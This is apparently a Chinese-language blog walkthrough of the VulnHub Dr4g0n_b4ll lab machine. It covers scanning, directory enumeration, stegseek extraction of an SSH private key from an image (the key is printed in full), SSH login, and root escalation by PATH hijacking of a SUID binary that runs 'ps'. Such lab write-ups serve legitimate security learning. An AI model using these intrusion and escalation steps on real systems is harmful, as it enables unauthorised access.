+++
date = '2026-11-27T18:51:41+08:00'
draft = false
title = '[VulnHub靶机]Dr4g0n_b4ll渗透记录'
tags = ['渗透','Vulnhub','隐写']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.27

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.27     00:0c:29:95:01:1b       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.014 seconds (127.11 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.27 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-28 20:39 +0800
Nmap scan report for 10.10.10.27
Host is up (0.00074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:95:01:1B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.27
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-28 20:41 +0800
Nmap scan report for 10.10.10.27
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b5:77:4c:88:d7:27:54:1c:56:1d:48:d9:a4:1e:28:91 (RSA)
|   256 c6:a8:c8:9e:ed:0d:67:1f:ae:ad:6b:d5:dd:f1:57:a1 (ECDSA)
|_  256 fa:a9:b0:e3:06:2b:92:63:ba:11:2f:94:d6:31:90:b2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: DRAGON BALL | Aj's
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:95:01:1B (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|storage-misc
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (97%), Google Android 10.X|11.X|9.X (94%), Netgear RAIDiator 4.X (94%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:9 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:netgear:raidiator:4.2.24
Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (97%), Linux 4.15 - 5.19 (97%), OpenWrt 22.03 (Linux 5.10) (95%), Linux 5.4 - 5.10 (94%), Android 10 - 11 (Linux 4.9 - 4.14) (94%), Android 9 - 11 (Linux 4.9 - 4.14) (94%), Linux 2.6.32 (94%), Linux 4.15 (94%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (94%), Linux 3.2 - 4.14 (94%)    
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.27                           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-28 20:43 +0800
Nmap scan report for 10.10.10.27
Host is up (0.00044s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /robots.txt: Robots file
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 00:0C:29:95:01:1B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.43 seconds
```

## Web渗透

访问80端口

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

访问robots.txt, 得到base64字符串

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/robots.avif)

解码得到提示, 让我们找到隐藏文件夹

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ echo eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI= | base64 -d
you find the hidden dir
```

目录爆破, 一无所获

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ gobuster dir -u http://10.10.10.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,sql,zip,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.27/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html,htm,sql,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 4355]
robots.txt           (Status: 200) [Size: 33]
server-status        (Status: 403) [Size: 276]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================
```

回顾主页源码, 注意到底部同样存在base64编码字符串

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/%E4%B8%BB%E9%A1%B5%E6%BA%90%E7%A0%81.avif)

依旧多层base64编码, 解码最终得到`DRAGON BALL`

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ echo  VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 -d
UkZKQlIwOU9JRUpCVEV3PQ==                                                                                                                                                                       
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 -d          
RFJBR09OIEJBTEw=                                                                                                                                                                       
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ echo RFJBR09OIEJBTEw= | base64 -d        
DRAGON BALL
```

访问`http://10.10.10.27/DRAGON%20BALL/`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/%E8%AE%BF%E9%97%AE%E9%9A%90%E8%97%8F%E7%9B%AE%E5%BD%95.avif)

secret.txt似乎是路径字典, 待会我们可以用它重新爆破一下试试

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/secret.avif)

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ gobuster dir -u http://10.10.10.27/ -w ./secret.txt -x php,html,htm,sql,zip,bak,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.27/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./secret.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              htm,sql,zip,bak,txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 136 / 136 (100.00%)
===============================================================
Finished
===============================================================
```

什么都没发现, 去看看VulnHub文件夹

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/vulnhub.avif)

aj.jpg是一张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/aj.avif)

login.html是个登陆页面, 但无交互无法登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Dr4g0nb4ll/login.avif)

## aj图像隐写破解

使用exiftool查看图片元数据, 没有收获

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ exiftool aj.jpg
ExifTool Version Number         : 13.55
File Name                       : aj.jpg
Directory                       : .
File Size                       : 75 kB
File Modification Date/Time     : 2021:01:05 19:09:29+08:00
File Access Date/Time           : 2026:11:28 21:21:25+08:00
File Inode Change Date/Time     : 2026:11:28 21:21:18+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 959
Image Height                    : 535
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 959x535
Megapixels                      : 0.513
```

binwalk查看内嵌文件, 也没有有用的信息

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ binwalk3 aj.jpg

                                                  /home/kali/Dr4g0nb4ll/aj.jpg
---------------------------------------------------------------------------------------------------------------------------------
DECIMAL                            HEXADECIMAL                        DESCRIPTION
---------------------------------------------------------------------------------------------------------------------------------
0                                  0x0                                JPEG image, total size: 75168 bytes
---------------------------------------------------------------------------------------------------------------------------------

Analyzed 1 file for 85 file signatures (187 magic patterns) in 6.0 milliseconds
```

使用stegseek成功使用密码短语love提取出文件`id_rsa`

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ stegseek aj.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "love"

[i] Original filename: "id_rsa".
[i] Extracting to "aj.jpg.out".
```

查看发现是个SSH私钥文件

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ cat aj.jpg.out
-----BEGIN OPENSSH PRIVATE KEY-----
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
Bd8180GtBAAaGtiwAAAAlrYWxpQGthbGk=
-----END OPENSSH PRIVATE KEY-----
```

考虑到login.html中的标题是"WELCOME TO xmen", 尝试使用`xmen`作为用户名, 使用私钥登录ssh

```shell
┌──(kali㉿kali)-[~/Dr4g0nb4ll]
└─$ ssh -i aj.jpg.out xmen@10.10.10.27
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux debian 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 07:09:06 2021 from 192.168.43.111
xmen@debian:~$ 
```

## 权限提升

查看当前家目录

```shell
xmen@debian:~$ ls -lah
total 36K
drwxr-xr-x 4 xmen xmen 4.0K Jan  5  2021 .
drwxr-xr-x 3 root root 4.0K Jan  4  2021 ..
-rw------- 1 xmen xmen  543 Jan  5  2021 .bash_history
-rw-r--r-- 1 xmen xmen  220 Jan  3  2021 .bash_logout
-rw-r--r-- 1 xmen xmen 3.5K Jan  3  2021 .bashrc
-rw-r--r-- 1 xmen xmen   43 Jan  2  2021 local.txt
-rw-r--r-- 1 xmen xmen  807 Jan  3  2021 .profile
drwxr-xr-x 2 root root 4.0K Jan  4  2021 script
drwx------ 2 xmen xmen 4.0K Jan  4  2021 .ssh
```

查看local.txt, 得到第一面flag

```shell
xmen@debian:~$ cat local.txt 
your falg :192fb6275698b5ad9868c7afb62fd555
```

进入script目录, 查看内容

```shell
xmen@debian:~$ cd script/
xmen@debian:~/script$ ls -lah
total 32K
drwxr-xr-x 2 root root 4.0K Jan  4  2021 .
drwxr-xr-x 4 xmen xmen 4.0K Jan  5  2021 ..
-rw-r--r-- 1 root root   75 Jan  4  2021 demo.c
-rwsr-xr-x 1 root root  17K Jan  4  2021 shell
```

demo.c应该是shell的源代码, 其功能是执行ps命令

```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
```

shell运行结果与C代码功能一致

```shell
xmen@debian:~/script$ ./shell 
   PID TTY          TIME CMD
  1192 pts/0    00:00:00 shell
  1193 pts/0    00:00:00 sh
  1194 pts/0    00:00:00 ps
```

因为未使用绝对路径, 考虑利用环境变量劫持提权  
首先创建一个叫ps的软链接, 指向/bin/bash, 由于script目录不可写, 所以在家目录中创建

```shell
xmen@debian:~$ ln -s /bin/bash ./ps
```

将当前路径添加到PATH环境变量的头部

```shell
xmen@debian:~/script$ export PATH=/home/xmen:$PATH
```

运行shell, 成功提权

```shell
xmen@debian:~/script$ ./shell
root@debian:~/script# whoami
root
```

读取flag

```shell
root@debian:~/script# cd /root
root@debian:/root# ls -lah
total 32K
drwx------  4 root root 4.0K Jan  5  2021 .
drwxr-xr-x 18 root root 4.0K Jan  3  2021 ..
-rw-------  1 root root 2.3K Jan  5  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4.0K Jan  3  2021 .local
-rw-------  1 root root    0 Jan  3  2021 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  509 Jan  5  2021 proof.txt
drwx------  2 root root 4.0K Jan  4  2021 .ssh
root@debian:/root# cat proof.txt 
   _____ __________                                         
  /     \\______   \          ___  ___ _____   ____   ____  
 /  \ /  \|       _/          \  \/  //     \_/ __ \ /    \ 
/    Y    \    |   \           >    <|  Y Y  \  ___/|   |  \
\____|__  /____|_  /__________/__/\_ \__|_|  /\___  >___|  /
        \/       \/_____/_____/     \/     \/     \/     \/       






join channel:   https://t.me/joinchat/St01KnXzcGeWMKSC


your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2
```
